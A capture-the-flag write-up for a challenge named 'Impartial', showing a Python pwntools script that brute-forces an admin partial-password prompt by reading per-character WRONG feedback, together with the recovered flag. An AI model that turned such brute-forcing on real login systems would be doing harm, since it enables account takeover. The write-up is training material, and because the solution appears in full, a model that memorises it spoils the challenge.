# Impartial

Author: [roerohan](https://github.com/roerohan)

# Requirements

- Python

# Source

```
Check out the terminal-interface for this new company! Can you uncover any secrets?

Connect with:
nc jh2i.com 50026
```

# Exploitation

Everytime you ask try to log in as admin, it asks you for 3 letters of the password.

```
Impartial Advice and Consulting
    . . . we will help you put the pieces together!

1. About
2. Login
3. Register
4. Contact
?. Exit

> 2

Please enter a username to log in.

Username: admin

For your security, please only enter a partial password.
To protect your account from hackers, enter only the characters
at position 13, 32, and 10 (separated by spaces).

Password: 
```

You can create a map of all characters and the possibilities of the character in that position. Once it is rejected, remove that possibility, and once it's correct, remove all other possibilities. Here's a script:

```python
from pwn import remote
import re
import string

r = remote("jh2i.com", 50026)

flag = [''] + list('flag{') + ['?']*50

letters = list(string.ascii_lowercase + '_}1234567890')
tries = {i: letters for i in range(1, 51)}


# flag = [''] + list('flag{partial?pass?ord?puz?le?pieces????????????????????')
# flag{partial_password_puzzle_pieces}
for i in range(1, len(flag)):
    if flag[i] == '?': continue
    tries[i] = [flag[i]]

rec = r.recvuntil(">").decode()
print(rec, end=" ")

while True:
    res = b"2"
    r.sendline(res)
    print(res)

    rec = r.recvuntil("Username:").decode()
    print(rec, end=" ")

    res = b"admin"
    r.sendline(res)
    print(res)

    rec = r.recvuntil("Password:").decode()
    print(rec, end=" ")

    indices = [int(i) for i in re.findall(r'\d+', rec)]

    res = []

    for index in indices:
        res.append(tries[index][0])

    res = ' '.join(res)
    print(res)
    r.sendline(res)

    rec = r.recvuntil('>').decode()
    print(rec)

    if '1. Judge' in rec:
        r.sendline(b'3')
        print(''.join(flag))
        continue

    x = rec.split('1. About')[0].strip().split('\n')

    for i in range(len(x)):
        t = tries[indices[i]]
        if 'WRONG' in x[i]:
            tries[indices[i]] = t[1:]
        else:
            tries[indices[i]] = [t[0]]
            flag[indices[i]] = t[0]
    print(''.join(flag))
```

When I ran the script for a while, I got this much of the flag:

```
$ python script.py
...
flag{partial?pass?ord?puz?le?pieces????????????????????
```

From here, you can possibly guess the flag.
<br />

The flag is:

```
flag{partial_password_puzzle_pieces}
```
